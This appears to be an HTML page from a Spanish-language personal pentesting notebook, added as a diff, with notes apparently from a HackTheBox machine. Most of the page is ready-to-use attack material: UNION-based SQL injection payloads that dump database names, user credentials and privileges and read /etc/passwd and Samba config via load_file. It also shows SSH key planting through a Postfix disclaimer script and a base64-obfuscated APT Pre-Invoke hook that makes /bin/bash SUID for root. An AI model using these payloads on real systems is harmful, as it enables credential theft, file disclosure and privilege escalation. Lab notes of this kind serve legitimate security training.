@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.11.101 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;client min protocol=SMB2&#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.10.11.101 <span class="nt">-N</span> <span class="nt">--option</span><span class="o">=</span><span class="s1">'client min protocol=SMB2'</span>
+</code></pre></div></div>
+
+<p>Manual SQLi - MySQL</p>
+
+<p>ERROR: no retorna una única columna</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION select 1;-- -
+</span></code></pre></div></div>
+
+<p>Welcome 2</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION select 1,2,3,4,5,6;-- -
+</span></code></pre></div></div>
+
+<p>Welcome writer</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION select 1,database(),3,4,5,6;-- -
+</span></code></pre></div></div>
+
+<p>Welcome 10.3.29-MariaDB-0ubuntu0.20.04.1</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION select 1,version(),3,4,5,6;-- -
+</span></code></pre></div></div>
+
+<p>Sacar los nombres de todas las tablas</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select 1,group_concat(table_name separator 0x3a),2,null,null,null FROM information_schema.tables --
+</span></code></pre></div></div>
+
+<p>Sacar nombres de columnas de una tabla</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select 1,group_concat(column_name separator 0x3a),3,4,5,6 FROM information_schema.columns WHERE table_name='</span><span class="n">users</span><span class="s1">';-- -
+</span></code></pre></div></div>
+
+<p>Extraer datos</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select 1,group_concat(username,0x3a,password),2,null,null,null FROM users;-- -
+</span></code></pre></div></div>
+
+<p>Listar privilegios</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,(select group_concat(privilege_type separator 0x3a)),2,null,null,null from information_schema.user_privileges where grantee=user();-- -
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,(select group_concat(privilege_type separator 0x3a) from information_schema.user_privileges where grantee=user()),2,null,null,null;-- -
+</code></pre></div></div>
+
+<p>Es Administrador</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union select 1,current_user,2,null,null,null;-- -
+</code></pre></div></div>
+
+<p>Leer archivos</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select 1,load_file('</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="s1">'),2,null,null,null FROM information_schema.tables -- -
+</span></code></pre></div></div>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' union select 1,load_file('</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span><span class="n">smb</span><span class="p">.</span><span class="n">conf</span><span class="s1">'),2,null,null,null FROM information_schema.tables -- -
+</span></code></pre></div></div>
+
+<h1 id="postfix"><strong>Postfix</strong></h1>
+
+<p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html#postfix">25,465,587 - Pentesting SMTP/s - HackTricks</a></p>
+
+<p>Ejecuta</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/postfix/master.cf
+</code></pre></div></div>
+
+<p>Que ejecuta</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/postfix/disclaimer
+</code></pre></div></div>
+
+<p>Metemos esta línea</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "pubkey kyle" &gt;&gt; /home/john/.ssh/authorized_keys
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> management 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-e</span> <span class="s1">'^/run'</span> <span class="nt">-e</span> <span class="s1">'^/sys'</span> <span class="nt">-e</span> <span class="s1">'^/proc'</span>
+</code></pre></div></div>
+<h1 id="management-group"><strong>Management group</strong></h1>
+
+<p>apt update</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/usr/bin/chmod u+s /bin/bash"'</span> | <span class="nb">base64</span> <span class="nt">-w0</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvdXNyL2Jpbi9jaG1vZCB1K3MgL2Jpbi9iYXNoIgo= | base64 -d | bash"};'</span> <span class="o">&gt;</span> 000-shell
+</code></pre></div></div>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
